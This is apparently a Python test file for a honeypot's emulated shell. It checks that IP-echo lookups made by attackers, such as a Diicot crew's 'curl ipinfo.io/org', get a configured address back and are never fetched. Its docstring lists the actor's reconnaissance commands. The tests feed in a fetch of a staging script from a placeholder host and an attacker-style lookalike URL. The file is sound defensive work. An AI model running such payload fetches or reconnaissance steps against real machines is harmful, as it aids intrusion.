r"""`curl ipinfo.io/org` answered with an ELF binary.

Forty-seventh coherence sweep, and this one came from live traffic rather
than a chosen axis. At 14:45 the Diicot crew logged in on 203.0.113.38
and profiled the box before committing a payload: uname, uptime, nproc,
lscpu model name, lspci for a VGA and a Radeon, nvidia-smi twice -- and

    curl ipinfo.io/org

which is how a loader asks who is hosting the machine it just landed on.
The shell answered \x7fELF\x02\x01\x01... Every URL went through the
download path, so an address-echo service came back as a synthesised
binary. Nothing on the internet answers that question with an ELF, and
it is asked early, before the actor commits.

The same was true of ifconfig.me, icanhazip.com, api.ipify.org,
ipinfo.io/ip and the rest. They are answered from the persona now, and
not fetched at all -- there is nothing to capture from them, and the
honeypot should not be making requests to third parties on an attacker's
behalf.

The address follows the rule already set for the proxy judges and quoted
in ssh_honeypot: it comes from HONEY_PUBLIC_IP in the unit, never from
the repository, and if it is unset nothing is invented. HONEY_PUBLIC_ORG
does the same for the AS/organisation string.

Reference: real ifconfig.me and ipinfo.io/ip return one line holding the
caller's address; ipinfo.io/org returns one line of "ASnnnnn Org Name";
ipinfo.io/json returns an object with ip, hostname and org among others.

Run from `honeypot/`, or on the guest.
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

os.environ["HONEY_PUBLIC_IP"] = "203.0.113.42"
os.environ["HONEY_PUBLIC_ORG"] = "AS64512 Example Hosting BV"

import fakeshell as fs                                          # noqa: E402

PASS, FAIL = [], []
IP = "203.0.113.42"
ORG = "AS64512 Example Hosting BV"


def run(script):
    events = []
    s = fs.Shell(fs.VFS(), log=lambda **k: events.append(k),
                 peer="198.51.100.9")
    s.exec_mode = True
    out = s.run(script)
    err = "".join(s._err)
    s._err.clear()
    return out, err, events


def check(name, cond, detail=""):
    (PASS if cond else FAIL).append(name)
    if not cond:
        print("  FAIL %-46s %s" % (name, detail))


def eq(name, got, want):
    check(name, got == want, "want %r got %r" % (want, got))


# -- the one the actor typed ---------------------------------------------

def t_the_command_diicot_ran():
    out, _e, _ev = run("curl ipinfo.io/org")
    eq("one line of text", out.strip(), ORG)
    check("not a binary", "\x7fELF" not in out, repr(out[:40]))


# -- the whole family ----------------------------------------------------

IP_URLS = ("ifconfig.me", "ifconfig.co", "icanhazip.com", "ipinfo.io/ip",
           "api.ipify.org", "ipecho.net/plain", "checkip.amazonaws.com",
           "ident.me", "myexternalip.com/raw")


def t_every_ip_echo_returns_the_address():
    for u in IP_URLS:
        out, _e, _ev = run("curl -s %s" % u)
        eq("curl %s" % u, out.strip(), IP)
        check("%s is not a binary" % u, "\x7fELF" not in out, repr(out[:30]))


def t_with_a_scheme_and_with_wget():
    for cmd in ("curl -s https://api.ipify.org",
                "curl -s http://ifconfig.me/",
                "wget -qO- ifconfig.me"):
        out, _e, _ev = run(cmd)
        eq(cmd, out.strip(), IP)


def t_the_json_form():
    out, _e, _ev = run("curl -s ipinfo.io/json")
    for want in ('"ip": "%s"' % IP, '"org": "%s"' % ORG, '"hostname"'):
        check("json carries %s" % want[:18], want in out, out[:90])


# -- nothing is fetched, nothing is captured -----------------------------

def t_no_download_event_and_no_capture():
    _o, _e, ev = run("curl -s ifconfig.me")
    kinds = [x.get("event") for x in ev]
    check("no download event", "download" not in kinds, kinds)
    check("no payload captured", "payload_captured" not in kinds, kinds)
    check("logged as a probe instead", "ip_echo_probe" in kinds, kinds)


def t_the_probe_records_which_question():
    _o, _e, ev = run("curl -s ipinfo.io/org")
    probes = [x for x in ev if x.get("event") == "ip_echo_probe"]
    check("one probe", len(probes) == 1, probes)
    if probes:
        eq("kind is org", probes[0].get("kind"), "org")
    _o, _e, ev = run("curl -s ifconfig.me")
    probes = [x for x in ev if x.get("event") == "ip_echo_probe"]
    if probes:
        eq("kind is ip", probes[0].get("kind"), "ip")


def t_the_handler_never_connects():
    import inspect
    body = inspect.getsource(fs.Shell._echo_service).split('"""', 2)[-1]
    for bad in ("socket", "urlopen", "self.download", "requests."):
        check("no %s in the handler body" % bad, bad not in body, body[:120])


# -- ordinary fetches are untouched --------------------------------------

def t_a_real_url_still_downloads():
    out, _e, ev = run("curl -s http://198.51.100.7/stage.sh")
    kinds = [x.get("event") for x in ev]
    check("still a download", "download" in kinds, kinds)
    check("not treated as an echo", "ip_echo_probe" not in kinds, kinds)


def t_a_lookalike_host_is_not_an_echo():
    """Only the known services, not anything with a similar name."""
    for u in ("http://evil.ifconfig.me.attacker.com/x",
              "http://198.51.100.7/ipinfo.io/org"):
        _o, _e, ev = run("curl -s %s" % u)
        kinds = [x.get("event") for x in ev]
        check("%s is not an echo" % u[:34],
              "ip_echo_probe" not in kinds, kinds)


def t_saving_to_a_file_works():
    s = fs.Shell(fs.VFS(), peer="198.51.100.9")
    s.exec_mode = True
    s.run("curl -s -o /tmp/myip ifconfig.me")
    s._err.clear()
    out = s.run("cat /tmp/myip")
    s._err.clear()
    eq("the file holds the address", out.strip(), IP)


# -- unset means nothing invented ----------------------------------------

def t_unset_invents_nothing():
    saved = os.environ.pop("HONEY_PUBLIC_IP", None)
    try:
        out, _e, _ev = run("curl -s ifconfig.me")
        eq("no address is made up", out.strip(), "")
        check("and still not a binary", "\x7fELF" not in out, repr(out[:30]))
    finally:
        if saved is not None:
            os.environ["HONEY_PUBLIC_IP"] = saved


TESTS = [t_the_command_diicot_ran, t_every_ip_echo_returns_the_address,
         t_with_a_scheme_and_with_wget, t_the_json_form,
         t_no_download_event_and_no_capture,
         t_the_probe_records_which_question, t_the_handler_never_connects,
         t_a_real_url_still_downloads, t_a_lookalike_host_is_not_an_echo,
         t_saving_to_a_file_works, t_unset_invents_nothing]


def main():
    for t in TESTS:
        try:
            t()
        except Exception as exc:                              # noqa: BLE001
            check(t.__name__, False, "crashed: %r" % (exc,))
    print("passed %d, failed %d" % (len(PASS), len(FAIL)))
    if FAIL:
        print("failed: " + ", ".join(FAIL[:8]))
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
